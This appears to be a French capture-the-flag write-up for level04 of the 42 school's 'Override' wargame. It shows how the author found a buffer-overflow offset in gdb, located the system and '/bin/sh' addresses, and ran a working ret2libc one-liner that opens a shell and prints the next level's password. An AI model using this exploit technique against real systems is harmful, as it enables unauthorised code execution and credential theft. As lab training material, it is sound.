# Override
Override 42 security level04

```
./level04
Give me some shellcode, k
test12
child is exiting...
```

On observe que le programme lit sur l'entrée standard, essayons de le faire segfalt.

```
# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
# Taille 300
gdb ./level04
(gdb) set follow-fork-mode child # Since there's a fork we want to follow the child process and not the parent one.
(gdb) r <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
Starting program: /home/users/level04/level04 <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
[New process 3327]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3327]
0x41326641 in ?? ()
```
On trouve donc que l'eip est à l'offset 156.
On ne trouve aucun accès au systeme donc comme precedemment nous allons proceder à une attaque de type ret2libc.

Adresse system:
```
gdb ./level04
(gdb) b * main
Breakpoint 1 at 0x80486c8
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486c8 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
Adresse /bin/sh
```
info proc map
find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```
Adresse retour
```
disass main
0x08048825 <+349>:	ret
```

Il ne nous reste donc plus qu'à lancer notre attaque:
```
level04@OverRide:~$ (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x25\x88\x04\x08" + "\xec\x97\xf8\xf7" + "\x0a"' ; cat ) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
